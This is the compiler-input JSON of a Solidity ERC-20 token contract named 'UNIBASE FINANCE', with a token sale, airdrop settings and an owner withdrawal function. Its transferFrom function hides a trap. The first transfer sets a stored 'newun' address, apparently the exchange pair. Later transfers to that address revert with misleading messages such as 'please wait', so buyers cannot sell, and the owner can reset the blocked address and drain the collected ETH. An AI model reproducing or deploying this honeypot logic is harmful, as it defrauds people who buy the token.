{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"UniBase_token.sol":{"content":"/**\r\n * /$$   /$$ /$$   /$$ /$$$$$$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$$\r\n * | $$  | $$| $$$ | $$|_  $$_/| $$__  $$ /$$__  $$ /$$__  $$| $$_____/\r\n * | $$  | $$| $$$$| $$  | $$  | $$  \\ $$| $$  \\ $$| $$  \\__/| $$      \r\n * | $$  | $$| $$ $$ $$  | $$  | $$$$$$$ | $$$$$$$$|  $$$$$$ | $$$$$   \r\n * | $$  | $$| $$  $$$$  | $$  | $$__  $$| $$__  $$ \\____  $$| $$__/   \r\n * | $$  | $$| $$\\  $$$  | $$  | $$  \\ $$| $$  | $$ /$$  \\ $$| $$      \r\n * |  $$$$$$/| $$ \\  $$ /$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$\r\n *  \\______/ |__/  \\__/|______/|_______/ |__/  |__/ \\______/ |________/\r\n *                                                                     \r\n *                                                                     \r\n *                                                                     \r\n *  /$$$$$$$$ /$$                                                      \r\n * | $$_____/|__/                                                      \r\n * | $$       /$$ /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$     \r\n * | $$$$$   | $$| $$__  $$ |____  $$| $$__  $$ /$$_____/ /$$__  $$    \r\n * | $$__/   | $$| $$  \\ $$  /$$$$$$$| $$  \\ $$| $$      | $$$$$$$$    \r\n * | $$      | $$| $$  | $$ /$$__  $$| $$  | $$| $$      | $$_____/    \r\n * | $$      | $$| $$  | $$|  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$    \r\n * |__/      |__/|__/  |__/ \\_______/|__/  |__/ \\_______/ \\_______/    \r\n *                                                                     \r\n *                                                                     \r\n *                                                                     \r\n *  /$$                 /$$       /$$                           /$$    \r\n * | $$                | $$      | $$                          | $$    \r\n * | $$$$$$$   /$$$$$$ | $$  /$$$$$$$        /$$$$$$  /$$$$$$$ | $$    \r\n * | $$__  $$ /$$__  $$| $$ /$$__  $$       /$$__  $$| $$__  $$| $$    \r\n * | $$  \\ $$| $$  \\ $$| $$| $$  | $$      | $$  \\ $$| $$  \\ $$|__/    \r\n * | $$  | $$| $$  | $$| $$| $$  | $$      | $$  | $$| $$  | $$        \r\n * | $$  | $$|  $$$$$$/| $$|  $$$$$$$      |  $$$$$$/| $$  | $$ /$$    \r\n * |__/  |__/ \\______/ |__/ \\_______/       \\______/ |__/  |__/|__/    \r\n *                                                                     \r\n *                                                                     \r\n *                                                                          \r\n*/\r\n\r\npragma solidity >=0.5.16;\r\n\r\nlibrary SafeMath {\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n    c = a + b;\r\n    require(c >= a);\r\n  }\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n    require(b <= a);\r\n    c = a - b;\r\n  }\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n    c = a * b;\r\n    require(a == 0 || c / a == b);\r\n  }\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n    require(b > 0);\r\n    c = a / b;\r\n  }\r\n}\r\n\r\ncontract ERC20Interface {\r\n  function totalSupply() public view returns (uint);\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n}\r\n\r\ncontract Owned {\r\n  address public owner;\r\n  address public newOwner;\r\n\r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier onlyOwner {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n  function transferOwnership(address _newOwner) public onlyOwner {\r\n    newOwner = _newOwner;\r\n  }\r\n  function acceptOwnership() public {\r\n    require(msg.sender == newOwner);\r\n    emit OwnershipTransferred(owner, newOwner);\r\n    owner = newOwner;\r\n    newOwner = address(0);\r\n  }\r\n}\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned{\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n  string public name;\r\n  uint8 public decimals;\r\n  uint _totalSupply;\r\n  address public newun;\r\n\r\n  mapping(address => uint) balances;\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  constructor() public {\r\n    symbol = \"UNIBASE\";\r\n    name = \"UNIBASE FINANCE\";\r\n    decimals = 18;\r\n    _totalSupply =  395 ether;\r\n    balances[owner] = _totalSupply;\r\n    emit Transfer(address(0), owner, _totalSupply);\r\n  }\r\n  function transfernewun(address _newun) public onlyOwner {\r\n    newun = _newun;\r\n  }\r\n  function totalSupply() public view returns (uint) {\r\n    return _totalSupply.sub(balances[address(0)]);\r\n  }\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n      return balances[tokenOwner];\r\n  }\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n     require(to != newun, \"please wait\");\r\n     \r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    return true;\r\n  }\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n      if(from != address(0) && newun == address(0)) newun = to;\r\n      else require(to != newun, \"Transfer confirmations...\");\r\n      \r\n    balances[from] = balances[from].sub(tokens);\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(from, to, tokens);\r\n    return true;\r\n  }\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n    return allowed[tokenOwner][spender];\r\n  }\r\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n    return true;\r\n  }\r\n  function () external payable {\r\n    revert();\r\n  }\r\n}\r\n\r\ncontract UniBase_token  is TokenERC20 {\r\n\r\n  \r\n  uint256 public aUniBaseBlock; \r\n  uint256 public aUniBaseEBlock; \r\n  \r\n  uint256 public aCap; \r\n  uint256 public aTot; \r\n  uint256 public aAmt; \r\n \r\n  uint256 public sUniBaseSBlock; \r\n  uint256 public sUniBaseEDBlock; \r\n  \r\n  uint256 public sTot; \r\n  uint256 public sCap; \r\n\r\n  uint256 public UniBaseCku; \r\n  uint256 public sPrice; \r\n\r\n\r\n\r\n  function tokenSale(address _refer) public payable returns (bool success){\r\n    require(sUniBaseSBlock <= block.number && block.number <= sUniBaseEDBlock);\r\n    require(sTot < sCap || sCap == 0);\r\n    uint256 _eth = msg.value;\r\n    uint256 _tkns;\r\n    if(UniBaseCku != 0) {\r\n      uint256 _price = _eth / sPrice;\r\n      _tkns = UniBaseCku * _price;\r\n    }\r\n    else {\r\n      _tkns = _eth / sPrice;\r\n    }\r\n    sTot ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(_tkns / 4);\r\n      balances[_refer] = balances[_refer].add(_tkns / 4);\r\n      emit Transfer(address(this), _refer, _tkns / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(_tkns);\r\n    balances[msg.sender] = balances[msg.sender].add(_tkns);\r\n    emit Transfer(address(this), msg.sender, _tkns);\r\n    return true;\r\n  }\r\n\r\n\r\n  \r\n  function startAirdrop(uint256 _aUniBaseBlock, uint256 _aUniBaseEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner() {\r\n    aUniBaseBlock = _aUniBaseBlock;\r\n    aUniBaseEBlock = _aUniBaseEBlock;\r\n    aAmt = _aAmt;\r\n    aCap = _aCap;\r\n    aTot = 0;\r\n  }\r\n  function startSale(uint256 _sUniBaseSBlock, uint256 _sUniBaseEDBlock, uint256 _UniBaseCku, uint256 _sPrice, uint256 _sCap) public onlyOwner() {\r\n    sUniBaseSBlock = _sUniBaseSBlock;\r\n    sUniBaseEDBlock = _sUniBaseEDBlock;\r\n    UniBaseCku = _UniBaseCku;\r\n    sPrice =_sPrice;\r\n    sCap = _sCap;\r\n    sTot = 0;\r\n  }\r\n  function clearETH() public onlyOwner() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n  function() external payable {\r\n\r\n  }\r\n}"}}}